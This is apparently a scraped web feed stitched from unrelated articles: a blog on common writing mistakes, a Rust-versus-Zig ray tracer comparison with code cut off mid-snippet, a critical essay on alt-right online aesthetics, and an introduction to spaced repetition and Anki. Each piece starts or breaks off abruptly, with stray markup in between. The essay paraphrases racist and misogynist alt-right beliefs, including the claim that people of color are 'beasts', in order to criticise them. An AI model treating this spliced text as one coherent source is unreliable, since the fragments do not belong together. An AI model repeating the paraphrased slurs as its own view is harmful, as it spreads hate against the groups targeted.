is</em>&nbsp;</strong>(i.e. it is used in place of these).</p><p><strong>Example of It's</strong><br><i><strong>It's</strong> going to be okay.</i></p><p><span data-preserver-spaces="true">The trick to using them correctly is to replace the confusing words with </span><em><span data-preserver-spaces="true">it has</span></em><span data-preserver-spaces="true">&nbsp;or&nbsp;</span><em><span data-preserver-spaces="true">it is</span></em><span data-preserver-spaces="true">&nbsp;and see if it makes sense. If the sentence sounds correct use&nbsp;</span><em><span data-preserver-spaces="true">it's</span></em><span data-preserver-spaces="true">&nbsp;otherwise use</span><em><span data-preserver-spaces="true">&nbsp;its</span></em><span data-preserver-spaces="true">.</span></p><h2><strong><span data-preserver-spaces="true">3. There's vs. theirs vs. they're</span></strong></h2><p><span data-preserver-spaces="true">There, their and they're almost all sound exactly the same but they are used in very different contexts.</span></p><p><strong>There</strong><span data-preserver-spaces="true"> refers to an idea or a place:</span></p><p><strong>Example of There</strong><br><em><span data-preserver-spaces="true"><strong>There</strong> is my garage.&nbsp;</span></em></p><p><strong>Their</strong><span data-preserver-spaces="true"> is possessive. It means something belonging to something or somebody:</span></p><p><strong>Example of Their</strong><br><em><span data-preserver-spaces="true"><strong>Their</strong> cat keeps hiding in our store.</span></em></p><p><strong>They're</strong> is a contraction like it's. It is used in place of they are:</p><p><strong>Example of They're</strong><br><em><strong>They're</strong> a really nice people.</em></p><h2><strong><span data-preserver-spaces="true">4. Commas</span></strong></h2><p>Commas (and other punctuation) are an essential part of writing. They help in improving readability and comprehensibility. A lot of new writers forget to learn the proper use of commas.</p><p><em><span data-preserver-spaces="true">Sam who loved computer games was the first to arrive at the carnival.</span></em></p><p>If you read the above sentence, you will find it confusing. This is because "who loved computer games" is not important but it <em>seems</em> to be&nbsp;an important part of the sentence. The corrected version sounds much better:</p><p><em><span data-preserver-spaces="true">Sam<strong>,</strong> who loved computer games<strong>,</strong> was the first to arrive at the carnival.</span></em></p><p><span data-preserver-spaces="true">The clause "<em>who loved computer games"</em> can be taken out without affecting the meaning of the sentence: <em>Sam was the first to arrive at the carnival</em>. In such sentences, it is a good idea to use a comma before and after the clause.</span><span data-preserver-spaces="true">&nbsp;</span></p><p><span data-preserver-spaces="true">Similarly in compound sentences in which two clauses are independent of each other, a comma should be included to indicate a pause:</span></p><p><em><span data-preserver-spaces="true">Mary was good at teaching, and it was a holiday.</span></em></p><h2><strong><span data-preserver-spaces="true">5. Sentence fragment</span></strong></h2><p><span data-preserver-spaces="true">Another mistake writers make is to use sentences that don't make sense on their own. When a sentence does not make sense independently it becomes a fragment.</span></p><p><strong>Example</strong><em><span data-preserver-spaces="true"><br>The war started between the two armies. And went on for a whole day.&nbsp;</span></em></p><p><span data-preserver-spaces="true">In the above sentences, the second one does makes no sense on its own. It is better to make it part of the first sentence:</span></p><p><em><span data-preserver-spaces="true">The war started between the two armies and went on for a whole day.&nbsp;</span></em></p><h2><strong><span data-preserver-spaces="true">6. Use of semicolons</span></strong></h2><p><span data-preserver-spaces="true">Semicolons are used when two sentences are related in such a way that the last sentences's meaning is not clear without the first one.</span></p><p><span data-preserver-spaces="true">A lot writers are intimidated by semicolons but their proper use can make your sentences and paragraphs easier to read and understand.</span></p><p><em><span data-preserver-spaces="true">The armies are near now; when they meet, the skies will burn.</span></em></p><p><span data-preserver-spaces="true">In the above example, the second part makes no sense without the first part.</span></p><h2><strong><span data-preserver-spaces="true">7. Weak introduction</span></strong></h2><p><span data-preserver-spaces="true">When a reader starts reading your writing, his first impression is lasting. If you make a lousy introduction readers will lose interest. It is important that the start should be interesting and energetic.</span></p><p><span data-preserver-spaces="true">You have to look at your writing and see what information you are giving the reader. If it does not give out anything then most probably your introduction is boring. Rewrite it.</span></p><h2><strong><span data-preserver-spaces="true">8. Jumping about the bush</span></strong></h2><p>No one likes long explanations. Get to the point. You must not bore the reader. Get to the point then elaborate as necessary.</p><p>You might feel like giving context is important but it is not. The reader is not interested in knowing the reasons until&nbsp;<em>after&nbsp;</em>you tell them the actual thing.</p><h2><strong><span data-preserver-spaces="true">9. Lack of research</span></strong></h2><p>No matter the length of your piece, do you research. I cannot stress on how important this is, and how a lot of writers avoid this extra work.</p><p>Writing is so fickle; one moment you are on the heights of inspiration and the other you seem to have forgotten the language. Aside from helping you get your facts straight, research gives a structure your piece. Consequently, this will filter out confusing or contradicting ideas, cliche and cringe descriptions, or in other words, content that no one wants to read.</p><div><p><strong><a href="https://blog.streetwriters.co/overcoming-writers-block/">Are you facing writer's block?</a></strong></p><p>I remember June of 2015. I came back from University, sat down to write in my daily journal, and picked up my pen. I stared at the blank page with a sense of impending doom. Writer's block. It was here. For so long, I had evaded its dark clutches, but it had caught up to me. I knew one day it would...</p><p><a href="https://blog.streetwriters.co/overcoming-writers-block/">Continue reading</a></p></div><p>Research also helps you figure out what is the best way to approach your audience. You do not want to blunder into the field having no idea how to take the next step. That is just inviting peril to feed on your brain.</p><h2><strong><span data-preserver-spaces="true">10. Show don't tell</span></strong></h2><p><em>Actions speak louder than words.&nbsp;</em>The less you show your audience the less they will know. Saying that your character is charismatic is just talk.&nbsp;<em>How </em>is he charismatic? Show the reader. Make it an immersive experience. Don't talk, show.</p><p>This mistake is, by far, the hardest to detect and fix. Many writers have tried to set some basic rules to avoid it; for example Stephen Kings tells you to not use adverbs. Why? Because adverbs are not descriptive. They <em>tell</em> what state the character is in but don't <em>show</em>.</p><blockquote><p>I believe the road to hell is paved with adverbs, and I will shout it from the rooftops.</p><p>Stephen King</p></blockquote><p><strong>Sentence 1</strong><br>He was in a hurry.</p><p><strong>Sentence 2</strong><br>He constantly looked at his watch, and every time his step would gain new energy as if Time propelled him towards his destination.</p><p>If you read the above sentences, the second one will immediately sound more intriguing. This is the power of&nbsp;<em>show don't tell.</em></p><h2><strong><span data-preserver-spaces="true">11. No editing</span></strong></h2><p>Editing is like cooking food. If you only put the ingredients into a pot and mix it, the result will be bland and boring. You must take the time to cook your writing, taste it after intervals and add spices or water as necessary, increase the heat, or you simply let it cook until the dish is ready.</p><p>Its given that the first draft of anything is going to be full of mistakes.<span data-preserver-spaces="true"> Do the revisions. Put in the extra work; it is worth the extra time.&nbsp;</span><span data-preserver-spaces="true">Even a quick skimming will help you fix grammatical mistakes and other obvious blunders.</span></p><h2><strong><span data-preserver-spaces="true">12. Editing as you go</span></strong></h2><p>Editing is not writing. I see this mistake (and sometimes even make it) very often among writers. They will start a piece and after the first few lines they will have started editing. The result? The piece never gets written. If you are editing, you are not writing.</p><p><span data-preserver-spaces="true">Writing is a continuous process and if you stop too much, your flow will break. You will lose the creativity and the freedom to express what you want.</span></p><p><strong>Rule of Thumb</strong><br>First write; then edit.</p><p><strong>Call of Writing</strong><br>We made an app to help writers focus more on their <em>writing</em> when writing. Be sure to <a href="https://callofwriting.com/" title="Call of Writing">check it out.</a> It is available on web, iOS, and Android.</p><h2><strong><span data-preserver-spaces="true">13. Wrong word</span></strong></h2><p><span data-preserver-spaces="true">The right word at the right instance is better than a whole paragraph of explanation. It needs practice and patience to use the right word but once you get into the habit your writing will improve drastically. With the right words you can convey an idea in a sentence that, otherwise, you can't even in a whole paragraph.</span></p><blockquote><p>The difference between the almost right word and the right word is really a large matter. 'tis the difference between the lightning bug and the lightning.</p><p><em>The Wit and Wisdom of Mark Twain</em>, Mark Twain</p></blockquote><h2>14. Writing like someone else</h2><p>I often see writers aspiring to write like Jane Austen or Mark Twain or Shakespeare, and I am inspired by such ambition. However, in trying to be someone else they forget their own voice; their pieces lack genuineness and creativity because in effort to write like Shakespeare they end up writing Shakespeare.</p><blockquote><p>You have to follow your own voice. You have to be yourself when you write. In effect, you have to announce, 'This is me, this is what I stand for, this is what you get when you read me. I'm doing the best I can—buy me or not—but this is who I am as a writer.</p><p>— David Morrell</p></blockquote><p>Finding your own voice in writing is important. The message you have to convey cannot be conveyed by someone else.</p><p>It is okay to aspire to become someone else but it is very important that you do not forget who you are.</p></div></div>]]>

<p>I spend most of my programming time writing C++. And like many other C++ programmers, I’ve shot myself in the foot countless times with a feature I didn’t fully grok. And I’ve spent enormous amounts of time trying to understand the language. Like many other C++ developers in this position, I find myself frequently daydreaming about switching to another more modern and easily understood language.</p>

<p>The two languages that I spent most of my time daydreaming about writing code in are Rust and Zig.</p>

<p>Rust, because of its focus on safety and performance. The language effectively tries to prevent you from shooting yourself in the foot. The language has been designed with more care than C++ – features are tested for feasibility in a nightly branch before being released. A few promising graphics libraries, like <code>gfx-rs</code>, make the language very appealing. But on the other hand, the language has a steep learning curve. Additionally, some of the <a href="https://www.reddit.com/r/rust/comments/a9stnw/rust_2019_and_beyond_limits_to_some_growth/ecn5e5o/?context=3">community discussion</a> gives me little hope that the language is going to stop growing anytime soon. At this time, there are already two slightly different ways of using modules.</p>

<p>Zig, because of its focus on robustness and clarity. The language aims to be easily readable and understandable. The language also features a very elegant take on metaprogramming and generics, far nicer to use than what you currently get in C++. But on the other hand, the language lacks lots of features, like operator overloading, interfaces, and traits.</p>

<p>Would the lack of features in Zig make me more or less productive than with Rust’s feature overload? Which language is more enjoyable to use for writing a small, self-contained computer graphics project?</p>

<p>To find out, I decided to implement the same simple project in both languages: a small ray tracer, following the book <a href="http://www.realtimerendering.com/raytracing/Ray%20Tracing%20in%20a%20Weekend.pdf">Ray Tracing in One Weekend</a>. Briefly put, ray tracing is a computer graphics algorithm in which light is simulated by shooting a bunch of rays from the camera into the scene and tracking the path the rays take as they interact with the scene. The book’s code samples are C++, but the code is not complex and lends itself well to being reimplemented in other languages. Here’s how it went.</p>

<h2 id="rendering-the-first-pixels">Rendering the first pixels</h2>

<p>To kick the project off, a way to display images is required. I wanted to render the image directly to an open window, instead of outputting the image to an image file, like the book does. So, to start this project off, I had to open a window and display some colored pixels on the screen.</p>

<p><img src="https://nelari.us/img/rust_and_zig/initial_pixels.png" alt="initial pixels">
</p><p><i>The goal of this section: open a small window and add some colors to the pixel buffer.</i></p>

<h3 id="rust">Rust</h3>

<p>In the C/C++ ecosystem, I’m most familiar with using the SDL media library for providing a window to use for rendering. Of course, you can use SDL in Rust as well. But Rusts’s main package registry, crates.io, actually had something better: the <code>minifb</code> crate (crates are Rust parlance for packages). It does one thing well – it lets you open a window and set its pixel buffer. No complex setup required, perfect!</p>

<p>Adding the crate was as easy as adding one line to <code>Cargo.toml</code>.</p>

<pre><code>[dependencies]
minifb = "0.11.2"
</code></pre>

<p>The crate was automatically downloaded and compiled in the background the next time the build was executed.</p>

<p>I have to say the discoverability of packages is really nice on websites like <a href="https://crates.io/">crates.io</a> and especially <a href="https://lib.rs/">lib.rs</a>. While many packages are not mature, it is nice to see what people have worked on in one place. If you want to find a C++ library, you most likely have to scrape through sourceforge, only to find something written during the last millenia using completely different style and standards than you are.</p>

<h3 id="zig">Zig</h3>

<p>Zig is a <em>very</em> new language in comparison to Rust. That means no convenient packages to get you started. But Zig has something else up its sleeve: C headers can be imported into the current Zig module using <code>@cInclude("SDL.h")</code> allowing you to use the C functions, structs, and even macro values directly in the Zig code. This made introducing SDL into the project fairly painless.</p>

<p>Zig actually goes a step further, because the Zig compiler is also a C compiler. I wrote a small C function to set pixel values in the window surface in C, and the C source file could be compiled alongside the Zig source, with the following small addition to the <code>build.zig</code> file, which tells the Zig compiler how your project should be built.</p>

<pre><code>// Add Zig source to the ray tracer executable
const exe = b.addExecutable("zig-tracer", "src/main.zig");
exe.setBuildMode(b.standardReleaseOptions());

// Add the C source file to the executable
exe.addCSourceFile("src/pixel.c", lib_cflags);
exe.addIncludeDir("src/");
exe.linkSystemLibrary("c");
</code></pre>

<p>This allows Zig to easily coexist alongside C source code.</p>

<h2 id="implementing-the-ray-tracer">Implementing the ray tracer</h2>

<p>Rendering images in the ray tracing book involves writing definitions for ray-sphere collision testing as well as writing definitions for how the ray interacts with the surface of a sphere once it collides.</p>

<p><img src="https://nelari.us/img/rust_and_zig/albedo_render.png" alt="albedo render">
</p><p><i>Testing whether my ray-sphere collision tests work: the scene rendered using just the color value of the object.</i></p>

<p><img src="https://nelari.us/img/rust_and_zig/normal_render.png" alt="normal map render">
</p><p><i>More tests: the scene rendered using the surface normal vector as a color.</i></p>

<p>Controlling how the ray interacts with the sphere’s surface is implemented using a number of different material objects, which define how the ray <em>scatters</em> from the sphere’s surface. The materials the book implements are lambertian (paper, marble), metal, and dielectric (glass).</p>

<p><img src="https://nelari.us/img/rust_and_zig/depth_render.png" alt="depth render">
</p><p><i>A render showing the number of times a ray has bounced off of a surface for each pixel. The brighter the pixel, the more bounces occurred.</i></p>

<p><img src="https://nelari.us/img/rust_and_zig/final_render.png" alt="final image">
</p><p><i>The final image containing a glass, lambertian, and metallic sphere. This is what we’re trying to accomplish in this section.</i></p>

<h3 id="rust-1">Rust</h3>

<h4 id="program-structure">Program structure</h4>

<p><em>Ray Tracing in One Weekend</em> adheres to a more old-fashioned style of C++, where relations between types are often modeled using inheritance. I opted to leave polymoprhism on the table and go for a very simple approach.</p>

<p>In Rust, there are no fancy inheritance mechanism so my scene objects, <code>World</code> and <code>Sphere</code>, are just simple structs.</p>

<pre><code>#[derive(Copy, Clone)]
pub struct Sphere {
    pub center: Vec3,
    pub radius: f32,
    pub material: Material,
}

pub struct World {
    spheres: Vec&lt;Sphere&gt;,
}

impl World {
    pub fn new(spheres: Vec&lt;Sphere&gt;) -&gt; World {
        World { spheres }
    }
}
</code></pre>

<p>As we can see from the definition of the <code>Sphere</code>, it has one field for a material. The sphere’s material can be any one of the three materials, lambertian, metal, or a dielectric. Once again, this could be a good place to use polymorphism, but I decided to use Rust’s really handy tagged unions instead.</p>

<pre><code>#[derive(Copy, Clone)]
pub struct Lambertian {
    pub albedo: Vec3,
}

#[derive(Copy, Clone)]
pub struct Metal {
    pub albedo: Vec3,
    pub fuzz: f32,
}

#[derive(Copy, Clone)]
pub struct Dielectric {
    pub refraction_index: f32,
}

#[derive(Copy, Clone)]
pub enum Material {
    Dielectric(Dielectric),
    Lambertian(Lambertian),
    Metal(Metal),
}

impl Material {
    pub fn lambertian(albedo: Vec3) -&gt; Material {
        Material::Lambertian(Lambertian { albedo })
    }

    pub fn metal(albedo: Vec3, fuzz: f32) -&gt; Material {
        Material::Metal(Metal { albedo, fuzz })
    }

    pub fn dielectric(refraction_index: f32) -&gt; Material {
        return Material::Dielectric(Dielectric { refraction_index });
    }
}

// Lambertian, Metal, and Dielectric scattering functions omitted for brevity
</code></pre>

<p>One could argue that the degree of code reuse is less in this scheme than in the book, since now we have to pattern match on the material union type to call their associated member scatter functions.</p>

<pre><code>let scatter = match hit.material {
    Material::Dielectric(d) =&gt; d.scatter(r, hit, rng),
    Material::Lambertian(l) =&gt; l.scatter(r, hit, rng),
    Material::Metal(m) =&gt; m.scatter(r, hit, rng),
};
</code></pre>

<p>But I thought it was an easy tradeoff to make.</p>

<p>Finally, one last missing bit from the ray tracer. Here’s the snippet which calculates whether a given ray intersects a sphere. You can see I created a <code>Hitable</code> trait for my sphere and world structs to implement. In the end, I did not need the trait, because I just called the <code>hit</code> functions directly on the objects. A little bit of premature “architecture” on my part.</p>

<pre><code>impl Hitable for Sphere {
    fn hit(&amp;self, ray: &amp;Ray, t_min: f32, t_max: f32) -&gt; Option&lt;HitRecord&gt; {
        let oc = ray.origin - self.center;
        let a = ray.direction.dot(ray.direction);
        let b = oc.dot(ray.direction);
        let c = oc.dot(oc) - self.radius * self.radius;
        let discriminant = b * b - a * c;

        if discriminant &gt; 0.0 {
            let mut temp = (-b - (b * b - a * c).sqrt()) / a;
            if temp &lt; t_max &amp;&amp; temp &gt; t_min {
                let hit_point = ray.point_at_parameter(temp);
                return Some(HitRecord {
                    t: temp,
                    p: hit_point,
                    n: (1.0 / self.radius) * (hit_point - self.center),
                    material: &amp;self.material,
                });
            }

            temp = (-b + (b * b - a * c).sqrt()) / a;
            if temp &lt; t_max &amp;&amp; temp &gt; t_min {
                let hit_point = ray.point_at_parameter(temp);
                return Some(HitRecord {
                    t: temp,
                    p: hit_point,
                    n: (1.0 / self.radius) * (hit_point - self.center),
                    material: &amp;self.material,
                });
            }
        }
        None
    }
}
</code></pre>

<h4 id="control-flow">Control flow</h4>

<p>After spending around a weekend’s worth of time with the project, the thing I actually liked most about Rust was the control flow.</p>

<p>The ability to return values from <code>if</code> expressions and blocks is awesome and I don’t know how I’ve managed to live up until now without it. Instead of conditionally assigning to a bunch of variables it is better to return them from an <code>if</code> expression instead.</p>

<pre><code>// Rust

// Returnign a tuple of values  out of an if expression
let …</code></pre></div></div>

<p><em>Editor’s Note: This article includes an in-depth inquiry into the online activities of political groups for which&nbsp;misogyny, racism, and anti-semitism&nbsp;become&nbsp;defining features; as such, images and mentions of those topics are found in the text.</em></p>
<p><em>Estimated read time: 29&nbsp;minutes.</em></p>
<p><span>For the greater part of the past year, I’ve been surveying the aesthetic sensibilities of nationalist internet hubs such as <a href="http://www.breitbart.com/">Breitbart</a>, <a href="http://boards.4chan.org/pol/">/pol</a>, <a href="https://www.reddit.com/r/The_Donald/">r/the_donald</a>, and similarly affiliated Facebook pages. These communities constitute what journalists and theorists have come to refer to as the </span><i><span>alt-right</span></i><span>—online neo-fascist groups whose growth mirrors and informs the growing nationalist, nativist sentiment as it is represented in the recent electoral success of the UK Independence Party, the Trump campaign, Austria’s Freedom Party, the French National Front, and Germany’s Alternative for Deutschland Party.</span></p>
<p><span>Briefly, before I begin thematizing the aesthetics of the alt-right, it is necessary to outline the definition of fascism that I am using in this essay. Fascism is an amorphous term with a multitude of definitions; the task of defining fascism has been attempted by numerous theorists including Deleuze and Guattari, Walter Benjamin, Arthur Rosenburg, Wilhelm Reich, and more. One useful definition I have encountered comes from semiotician Umberto Eco, who himself was a child during Mussolini’s fascist regime. In his essay </span><i><span>Ur-Fascism</span></i><span>, Eco identifies themes and rhetorical habits that underpin fascism (although his interrogation is limited to describing what fascism looks and sounds like, as opposed to the mechanism by which it emerges).<span id="easy-footnote-1-490"></span><span><a href="#easy-footnote-bottom-1-490" title="Umberto Eco, “Ur-Fascism” <i>The New York Review of Books, </i>June 22 1995, <a href=&quot;http://www.nybooks.com/articles/1995/06/22/ur-fascism/&quot;>http://www.nybooks.com/articles/1995/06/22/ur-fascism/</a>."><sup>1</sup></a></span></span><span> Some of the characteristics that I will refer to in my aesthetic survey include:</span></p>

<ol>
<li><span>the </span><i><span>cult of tradition</span></i><span> which idealizes a primordial past (think </span><i><span>Make America Great Again,</span></i><span> or Mussolini’s call to build a new Rome, a call recently echoed by White Nationalist Richard Spencer<span id="easy-footnote-2-490"></span><span><a href="#easy-footnote-bottom-2-490" title="Sam Kestenbaum, “Who is Alt-Right Figurehead Richard Spencer” <a href=&quot;http://forward.com/news/355260/who-is-alt-right-figurehead-richard-spencer/&quot;>http://forward.com/news/355260/who-is-alt-right-figurehead-richard-spencer/</a> (November 2016)"><sup>2</sup></a></span></span><span>).</span></li>
<li><i><span>fear of difference</span></i><span>, whether </span><i><span>difference</span></i><span> be sexual, gendered, religious, or racial.</span></li>
<li><span>a </span><i><span>cult of masculinity</span></i><span> that, tends to manifest itself in an obsession with sexual politics (refer to online pick-up artistry and the heteronormative gender roles embodied in the nuclear family.)</span></li>
<li><i><span>a hostility towards parliamentary politics</span></i><span>, criticality, and reason.</span></li>
<li><span>a belief in</span><i><span> permanent warfare</span></i><span> and a corresponding </span><i><span>cult of action for action’s sake</span></i><span>. </span></li>
<li><span>a </span><i><span>worship of technology</span></i><span>, not in the manner of an Enlightenment-esque worship of reason, but faith in technology to conquer and to reaffirm inegalitarianism.</span></li>
</ol>

<p><span>The online neo-fascist movement, the alt-right</span> <span>consists of a number of different groups, although certain tenets (all of which align with Eco’s criteria for ur-Fascism) are quite consistent throughout these communities in some form or fashion—a preference for authoritarianism over democracy, scientific racism and misogyny under the palatable term “human biodiversity,” and suspicion towards what they perceive to be the cultural hegemony of the left as evidenced in the liberal leanings of the mainstream media, the entertainment industry, and academia. Their economic views are difficult to discern, with protectionism, accelerated free market global capitalism, and anarcho-capitalism all being advocated in different communities.</span></p>

<p><span>Indexing these movements across a two axis chart </span><i><span>(fig. a) </span></i><span>is productive for the intents and purposes of this paper; however, what is most interesting to observe is instances in which these communities convene in internet “public spaces” (which are not public at all), most notably reddit and 4chan. Their creative propagandic images are disseminated throughout social media and oftentimes matriculate all the way up to the Twitter accounts of political leaders, activists, entertainers, and of course, into our national consciousness. As I will refer to this chart throughout this essay, I would like to clarify its organizational logic. Groups, terms, and individuals are plotted according to their variations on the central tenets of the alt-right’s ideological disposition, namely in regards to Nationalism and Faith. </span></p>
<p><span>Nationalism in general is a defining characteristic of the alt-right; however, within the nationalist ideology there are degrees of variation, particularly in regard to the status of Jewish people and Israel. Representatives from groups that more closely embody economic nationalism can still be considered mainstream figures since their rhetoric skirts around social issues such as race and religion. On the opposite side, the groups share a nationalist ideology, but the rhetoric takes on a distinctly racialized, often anti-Semitic, tone—a stark contrast to the staunchly pro-Israel economic nationalist groups epitomized in the Trump Administration itself. </span></p>
<p><span>Towards the bottom of the chart, the religio-philosophical underpinnings of the alt-right contrast. &nbsp;On the left side of the chart are the individuals and movements that place their faith in inegalitarian readings of traditionally recognized religion. Perhaps echoing Julius Evola’s spiritual racism, various communities re-read Christian mysticism, Zen Buddhism, and Hindu polytheism, ultimately and bewilderingly drawing White Supremacist conclusions. On the bottom-right, we see a more technocratic, hypercapitalist neo-fascism that places its faith in markets, accelerated capitalism, and “empirical” science to reveal the truly inegalitarian hierarchy key of racial classification. In a sense, there is a loose historical allegory to be found here: the spiritual quadrant of the alt-right finds coherence in Julius Evola’s spiritual justification for fascism (a concept that was quite appealing to Mussolini), while the techno-determinist quadrant draws influence from Nazist racism, which uses a biological justification. Thus, opposite axes should not be understood as antithetical; the axes are constitutive and relational, accounting for variations in nationalism and faith.</span></p>

<p><a href="#"><em>Economic Nationalism</em></a></p>
<p><span>The faction of the alt-right that I’ve labeled as “economic nationalist” </span><i><span>(fig. b)</span></i><span> is the most recognizable aspect of the alt-right; it can be argued that they now occupy the executive branch of the United States government. At the very least, they (via the appointment of Breitbart News executive chair Steve Bannon as Trump’s new strategist) occupy the position of the President-Elect’s right-hand man. Beyond Bannon and Trump, self-identified major contributors of the public alt-right</span> <span>include Breitbart, its tech editor Milo Yiannopolous, and international populist movements such as the National Front. These movements, figures, and publications have found a receptive audience in a number of online communities that are defined by gamer culture and what has been in the past referred to as the </span><i><span>Manosphere</span></i><span>. Almost exactly as it sounds, the </span><i><span>Manosphere</span></i><span> refers to a loose affiliation of anti-feminist men’s rights groups across the internet, including the subreddits </span><i><span>r/theredpill</span></i><span>, </span><i><span>r/mgtow<span id="easy-footnote-4-490"></span><span><a href="#easy-footnote-bottom-4-490" title="The acronym MGTOW stands for “Men Going Their Own Way,” away from mainstream discourses of gender egalitarianism."><sup>4</sup></a></span></span></i><span>&nbsp;and forums such as bodybuilding.com and a variety of smaller blogs.<span id="easy-footnote-5-490"></span><span><a href="#easy-footnote-bottom-5-490" title="For a list of manosphere-type websites, refer to <a href=&quot;https://www.trp.red/blogs/&quot;>https://www.trp.red/blogs/</a>"><sup>5</sup></a></span></span><span>&nbsp;The </span><i><span>Manosphere </span></i><span>also focuses on pickup artistry (PUA) or seduction training, which attempts to pathologize female personality types and empirically develop strategies to seduce them.

<p><span>This image </span><i><span>(fig. c)</span></i><span> is pulled from the Facebook meme page </span><i><span>Edgy Memes and Fashy Dreams</span></i><span>.

The </span><i><span>other</span></i><span> is presented as both a subhuman degenerate and an existential threat; in Eco’s words, he is “at the same time too strong and too weak.”<span id="easy-footnote-8-490"></span><span><a href="#easy-footnote-bottom-8-490" title="Eco, <i>Ur Fascism</i>."><sup>8</sup></a></span></span><span>&nbsp;Alluding to the overlap between the </span><i><span>manosphere </span></i><span>and the gaming community, signifiers of virtuality—the game-packaging design, the logo, and the title </span><i><span>Europe Simulator 2016</span></i><span>—place faith in the computer simulation in accurately modeling a current state of affairs. Note that there is nobody to identify with in this depiction; we are certainly not the foreigner and, since we are entering from a fundamentally male space, we are not the victim. It is only possible for us to </span><i><span>identify as the simulation itself</span></i><span>. This is a motif that, as I will describe throughout this essay, is highly desirable for the alt-right. Ultimately, this religious faith in technology to make sense of and organize the world reflects the alt-right’s faith that science will undermine the propagandic, false ideology of racial egalitarianism, revealing that people of color truly are, empirically, beasts to be subjugated, rejected, or annihilated.</span></p>
<p><span>The overtly sexual-political fantasy here cannot be ignored of course; after all, a key rhetorical strategy against immigration has been to pigeonhole the immigrant as a rapist, drawing from admittedly real and troubling events such as the New Years 2016 Cologne sexual assaults. Trump’s comments that labeled Mexicans as rapists during his campaign serve a similar role to these fear-mongering tactics. However, we find a contradiction in the perceived threat of rape, since the </span><i><span>Manosphere </span></i><span>tends to engage in rape-apologetics</span><span>&nbsp;and victim-blaming. Thus, we can postulate that in this image, the alt-right and its </span><i><span>Manosphere </span></i><span>constituency does not take issue with rape itself (which is not to say, of course, that rape and its depictions are not of great importance and concern), but that the rapist is black.

<p>You would have done better in school, for starters. Instead of turning in your bed unable to sleep terrified of the exam coming the next day, you would soundly sleep with the knowledge that you know everything you need to know to ace the exam. And ace it you would indeed.</p>

<p>You would have spent fewer hours studying. How many times have you opened the textbook only to find that you’ve forgotten all that you’d studied the day before? If you did not forget things then those hours you spent studying would always amount to something, instead of leaving you feeling like you’re swimming against the current. School might even have been fun if you did not forget.&nbsp;</p>

<p>What would your career look like if you did not forget?</p>

<p>Forgetfulness affects us all. There is no one that has not grappled with this problem before. Our lives would be better if we did not forget.&nbsp;</p>

<p>Unfortunately, <span>forgetting is inescapable.</span> There is no such thing as a perfect memory. I am not here to sell you on a magic pill that will turn you into Bradley Cooper in the movie Limitless.</p>

<p>However, that doesn’t mean there aren’t things you can do to massively reduce the speed at which you forget things, because there are.&nbsp;</p>

<p>Science has known about what it takes to get memories to stick around in your memory for a long time. It has known about it for a while now, in fact. It’s just that it has done a terrible job so far at making sure that you know about it, you whose life would massively benefit from that knowledge.</p>

<p>My intent for writing this is to correct these wrongs and introduce you to spaced repetition, the more than established method that will put you in control of your memory once and for all, and Anki, the software that will help you do so.&nbsp;</p>

<p>So, let’s start at the beginning: <span> What is spaced repetition?</span></p>

<h2 id="the-centuries-old-science-they-dont-tell-you-about">The Centuries Old Science They Don’t Tell You About</h2>

<p>More than a hundred years ago, the German psychologist Hermann Ebbinghaus not only started the scientific study of memory, but he also made its most impactful discovery.&nbsp;</p>

<p>After all, what discovery could be more impactful than what makes memories stick?</p>

<p>Ebbinghaus created various lists of nonsense syllables that he had to memorize, and once he was able to mouth off the entire list without making a single mistake he would mark on his calendar the day where he had to memorize that list once more.&nbsp;</p>

<p>He would have to memorize some lists the day after, others a week and some a whole month after he had first memorized them. Doesn’t sound much fun, does it? This is especially true when you take into account each list must have taken him quite a long time to memorize since by design each of the three-letter syllables he had to study had been chosen so that they weren’t easily remembered. For example, the syllable BOL was out of the question as Ebbinghaus could instead use BALL to recall it.&nbsp;</p>

<p>After the requisite time had passed, to measure the extent to which he had forgotten the list he’d spent so much time memorizing, he memorized the same list once more. Not only did he have to sit still in his office for a long time trying to memorize a bunch of nonsense words once, he had to do it twice! Throughout his second attempt he did have some help since it would take him less time to memorize the list the second time around if he remembered it from his first foray cramming it into his memory.&nbsp;</p>

<p>If by that point he’d already forgotten it, then it would take him at least as much time to memorize the list the second time as it had the first. However, if some memory of it still lingered in the confines of his mind, he would be able to go through the list faster than before. By varying the amount of time between each attempt, and seeing how that influenced how long it took him then to memorize the list the second time, <span>Ebbinghaus was able to measure the effect time had on his memory.</span></p>

<p>And what an effect it had.&nbsp;</p>

<p>The first thing he noticed was that memories are at their most fragile when they are still young. From the data he’d collected, he could see that the bulk of forgetting happens in the few moments after the memory is created. Rather than forgetting happening at a linear pace over time, each day that passes nicking a constant amount of the vitality of a memory until it is completely forgotten, Ebbinghaus discovered <span>forgetting happens rather rapidly at first but slows down afterward.&nbsp;</span></p>

<p>In the first few hours of its life, it’s as if your newly created memory has jumped out of a flying airplane and is now free-falling through the sky, the wind buffeting its face violently as it quickly loses altitude. As the ground becomes uncomfortably close, our memory activates its parachute and begins to glide, still falling, of course, but much slower than it was when it first jumped out of the plane.&nbsp;
&nbsp;
Now, to be sure, <span>the forgetting curve,</span> as this discovery came to be called, is an important landmark in the scientific study of memory, but it’s not a particularly useful one. We forget things over time; what a discovery! You don’t need to be a top-level scientist to come to that conclusion. It’s why we’re here in the first place!</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/b79bb8c6906d331e07905d708043194c5288a3bd/e385a/assets/images/agentleintroductiontoanki/forgettingcurve_alternative.jpg" alt=""></p>
<p> Behold, my superlative drawing skills!</p>
<p>But Ebbinghaus didn’t stop there.
&nbsp;
When he first started learning his lists of nonsense syllables, Ebbinghaus, like many a student, crammed all his studying in a single furious session. But then, possibly because he was fed up with all the cramming, he hit upon the idea of spreading his learning over time. Instead of spending the majority of a day learning one of his lists, he spaced out his learning over a few days. <span>What he found when he did so is the most important discovery about memory that no one ever told you about.</span></p>

<p>You would think not much would change if instead of studying a bunch of material in one day you did so over three or more days. But what Ebbinghaus found was that not only did his memory get stronger, but it also took him less time to memorize his lists. This meant that <span>simply by changing when he studied, Ebbinghaus could have the best of both worlds: a better memory with less time spent studying.&nbsp;</span></p>

<p>It need not be pointed out how important a discovery this is. If someone came up to you and told you about a revolutionary studying method that would not only cut the time you spent studying but also get you to retain the things you learn for longer, you would think you were being sold on some sort of scam.</p>

<p>Yet <span>the spacing effect,</span> as Ebbinghaus’ discovery is called, is far from being a scam. It is <span>one of the most scientifically supported discoveries in the entire field of psychology.</span></p>

<p>The gist of the spacing effect is rather simple. Given the choice between massing all your studying or spacing it out over a period of time, you are better served by spacing it out. <span>There is no catch. It really is that simple.&nbsp;</span></p>

